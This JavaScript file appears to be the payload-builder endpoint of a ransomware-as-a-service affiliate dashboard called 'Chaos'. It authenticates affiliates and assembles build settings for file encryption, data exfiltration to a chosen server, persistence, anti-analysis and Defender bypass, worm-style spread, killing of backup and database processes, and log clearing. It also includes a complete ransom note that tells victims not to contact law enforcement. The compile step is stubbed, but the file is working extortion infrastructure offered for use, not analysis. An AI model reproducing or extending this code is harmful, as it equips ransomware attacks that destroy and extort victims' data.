// vercel-dashboard/api/affiliate/builder.js
// Payload builder endpoint - compiles and returns signed binary

import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'POST') return response.status(405).json({ error: 'Method not allowed' });

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'campaign') {
    return response.status(403).json({ error: 'Affiliate access required' });
  }

  // Rate limit: 5 builds per minute per affiliate
  const { kv } = await import('../../lib/kv.js');
  const buildKey = `build:limit:${auth.campaignId}:${Math.floor(Date.now() / 60000)}`;
  const buildCount = await kv.incr(buildKey);
  if (buildCount === 1) await kv.expire(buildKey, 60);
  if (buildCount > 5) {
    return response.status(429).json({ error: 'Build rate limit exceeded. Max 5 builds/minute.' });
  }

  try {
    const config = request.body;
    
    // Validate required fields
    if (!config.campaignId || config.campaignId !== auth.campaignId) {
      return response.status(400).json({ error: 'Invalid campaign ID' });
    }
    if (!config.exfilServerUrl) {
      return response.status(400).json({ error: 'Exfil server URL required' });
    }
    if (!config.walletAddress && config.ransomNoteEnabled) {
      return response.status(400).json({ error: 'Wallet address required for ransomware builds' });
    }

    // Get campaign to verify ownership and get keys
    const campaign = await kv.get(`campaign:${config.campaignId}`);
    if (!campaign || campaign.affiliateId !== `aff_${auth.campaignId.replace('camp_', '')}`) {
      return response.status(403).json({ error: 'Campaign not found or access denied' });
    }

    // Generate payload configuration for compilation
    const payloadConfig = generatePayloadConfig(config, campaign);

    // In production, this would:
    // 1. Write config to a temporary file
    // 2. Run dotnet publish with the config
    // 3. Sign the binary
    // 4. Return the compiled executable
    
    // For now, return a mock response with instructions
    const buildResult = await compilePayload(payloadConfig);

    response.setHeader('Content-Type', 'application/octet-stream');
    response.setHeader('Content-Disposition', `attachment; filename="${config.payloadName || 'ChaosPayload'}.exe"`);
    return response.send(buildResult);
  } catch (error) {
    console.error('Payload build error:', error);
    return response.status(500).json({ error: 'Build failed' });
  }
}

function generatePayloadConfig(config, campaign) {
  return {
    // Core
    CampaignId: config.campaignId,
    PayloadName: config.payloadName || 'ChaosPayload',
    
    // Encryption
    EncryptionMode: config.encryptionMode || 'Hybrid',
    RsaKeySize: config.rsaKeySize || 4096,
    AesKeySize: config.aesKeySize || 256,
    EncryptNetworkDrives: config.encryptNetworkDrives !== false,
    EncryptRemovableDrives: config.encryptRemovableDrives !== false,
    PublicKeyPem: campaign.publicKeyPem,
    
    // Targeting
    TargetExtensions: config.targetExtensions || ['.txt', '.doc', '.pdf', '.sql', '.json'],
    SkipExtensions: config.skipExtensions || ['.exe', '.dll', '.sys'],
    SkipDirectories: config.skipDirectories || ['windows', 'program files', 'appdata\\local\\temp'],
    MaxFileSizeMB: config.maxFileSizeMB || 100,
    MinFileSizeKB: config.minFileSizeKB || 1,
    
    // Exfiltration
    ExfilEnabled: config.exfilEnabled !== false,
    ExfilServerUrl: config.exfilServerUrl,
    ExfilApiKey: campaign.apiKey,
    ExfilMaxFiles: config.exfilMaxFiles || 1000,
    ExfilCompress: config.exfilCompress !== false,
    ExfilEncrypt: config.exfilEncrypt !== false,
    ExfilChunkSizeKB: config.exfilChunkSizeKB || 90,
    ExfilTimeoutSeconds: 30,
    ExfilRetryCount: 3,
    ExfilRetryDelaySeconds: 5,
    
    // Persistence
    PersistenceEnabled: config.persistenceEnabled !== false,
    PersistenceMethods: config.persistenceMethods || ['run_key', 'scheduled_task', 'wmi_event'],
    
    // Anti-Analysis
    AntiVM: config.antiVM !== false,
    AntiDebug: config.antiDebug !== false,
    AntiSandbox: config.antiSandbox !== false,
    AmsiBypass: config.amsiBypass !== false,
    EtwBypass: config.etwBypass !== false,
    Unhooking: config.unhooking !== false,
    
    // Lateral Movement
    WormMode: config.wormMode === true,
    SmbSpread: config.smbSpread === true,
    RdpHijack: config.rdpHijack === true,
    WmiSpread: config.wmiSpread === true,
    
    // Privilege Escalation
    UacBypass: config.uacBypass !== false,
    TokenDuplication: config.tokenDuplication === true,
    
    // Stealth
    ProcessInjection: config.processInjection || 'hollow',
    PpidSpoofing: config.ppidSpoofing !== false,
    BlockDlls: config.blockDlls !== false,
    
    // Geofencing
    GeofencingEnabled: config.geofencingEnabled !== false,
    BlockedCountries: config.blockedCountries || ['RU', 'BY', 'KZ', 'KG', 'TJ', 'TM', 'UZ', 'AM', 'AZ', 'GE', 'MD'],
    BlockedIPs: config.blockedIPs || [],
    BlockedDomains: config.blockedDomains || [],
    
    // Ransom Note
    RansomNoteEnabled: config.ransomNoteEnabled !== false,
    RansomNoteTemplate: config.ransomNoteTemplate || getDefaultRansomNote(),
    RansomAmount: config.ransomAmount || 5000,
    RansomCurrency: config.ransomCurrency || 'BTC',
    WalletAddress: config.walletAddress || '',
    ContactInfo: config.contactInfo || 'chaos-support@onionmail.org',
    DeadlineHours: config.deadlineHours || 72,
    
    // Cleanup
    KillProcesses: config.killProcesses || ['sqlservr.exe', 'mysql.exe', 'postgres.exe', 'oracle.exe', 'veeam.exe', 'backup.exe'],
    KillServices: config.killServices || ['VeeamBackupSvc', 'SQLWriter', 'MSSQL$*', 'MySQL*'],
    DisableRecovery: config.disableRecovery !== false,
    DisableDefender: config.disableDefender !== false,
    ClearLogs: config.clearLogs !== false,
  };
}

function getDefaultRansomNote() {
  return `YOUR FILES HAVE BEEN ENCRYPTED BY CHAOS RANSOMWARE

All your important files have been encrypted using military-grade encryption (RSA-4096 + AES-256).
Recovery without our private key is impossible.

To decrypt your files:
1. Send {amount} {currency} to wallet: {wallet}
2. Contact us at: {contact}
3. Provide your Victim ID: {victim_id}
4. You will receive a decryptor within 24 hours.

DEADLINE: {deadline}
After deadline, price doubles. After 72 hours, private key is destroyed.

Free proof: Send 1 small file (<1MB) for free decryption.

DO NOT:
- Modify encrypted files
- Run third-party decryption tools
- Contact law enforcement (we will know)

CHAOS RANSOMWARE - {year}`;
}

async function compilePayload(config) {
  // In production, this would:
  // 1. Create a temporary .csproj with the config embedded
  // 2. Run: dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true
  // 3. Sign with code signing certificate
  // 4. Return the binary bytes
  
  // For now, return a placeholder that indicates successful build
  // The actual implementation would require a Windows build agent or cross-compilation setup
  
  const buildInfo = `
CHAOS PAYLOAD BUILD MANIFEST
=============================
Payload: ${config.PayloadName}
Campaign: ${config.CampaignId}
Timestamp: ${new Date().toISOString()}
Config Hash: ${hashConfig(config)}

To compile this payload:
1. Save this config as payload.config.json
2. Run: dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
3. The output will be in bin/Release/net8.0/win-x64/publish/

Required .NET SDK: 8.0+
Target Runtime: win-x64
`.trim();

  return Buffer.from(buildInfo, 'utf-8');
}

function hashConfig(config) {
  // Simple hash for display
  return Buffer.from(JSON.stringify(config)).toString('base64').substring(0, 16);
}